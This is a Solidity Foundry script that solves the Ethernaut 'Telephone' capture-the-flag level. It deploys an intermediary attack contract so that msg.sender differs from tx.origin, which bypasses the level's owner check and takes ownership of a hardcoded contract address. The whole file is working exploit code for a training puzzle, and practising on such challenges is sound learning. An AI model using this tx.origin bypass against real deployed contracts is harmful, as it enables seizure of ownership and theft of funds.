// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackContract {
    Telephone telephone;

    constructor (address _address) public {
        telephone = Telephone(_address);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephone = Telephone(0x2c876e4684DB3b6dF702C4603c06c1617A2D606C);

    function run() external {
        address owner = telephone.owner();
        address player = vm.envAddress("MY_ADDRESS");

        console.log("Player : ", player);
        console.log("Owner : ", owner);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackContract attackContract = new AttackContract(address(telephone));

        attackContract.attack();

        console.log("Owner after : ", telephone.owner());

        vm.stopBroadcast();
    }
}